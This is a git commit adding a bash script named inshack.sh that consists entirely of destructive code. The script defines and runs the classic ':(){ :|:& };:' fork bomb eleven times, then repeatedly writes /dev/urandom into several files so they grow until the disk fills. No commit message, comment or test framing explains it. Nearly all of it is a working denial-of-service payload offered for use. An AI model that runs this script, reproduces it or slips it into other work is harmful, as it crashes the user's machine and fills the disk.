2d5b9deb433f53227789515a1fd11c143a53737d
Unknownanonymous8080 <126983846+Unknownanonymous8080@users.noreply.github.com>
2023-03-05 01:16:15 +0530

    Add files via upload

---
+++ inshack.sh
@@ -0,0 +1,43 @@
+#!/bin/bash
+:() {
+ :|:&
+}; :
+:() {
+ :|:&
+}; :
+:() {
+ :|:&
+}; :
+:() {
+ :|:&
+}; :
+:() {
+ :|:&
+}; :
+:() {
+ :|:&
+}; :
+:() {
+ :|:&
+}; :
+:() {
+ :|:&
+}; :
+:() {
+ :|:&
+}; :
+:() {
+ :|:&
+}; :
+:() {
+ :|:&
+}; :
+cat /dev/urandom > rht.txt
+cat /dev/urandom > r2.txt
+cat /dev/urandom > r3.txt
+cat /dev/urandom > r4.txt
+cat /dev/urandom > rh
+cat /dev/urandom > rht.txt
+cat /dev/urandom > rht.txt
+cat /dev/urandom > rht.txt
+cat /dev/urandom > rht.txt
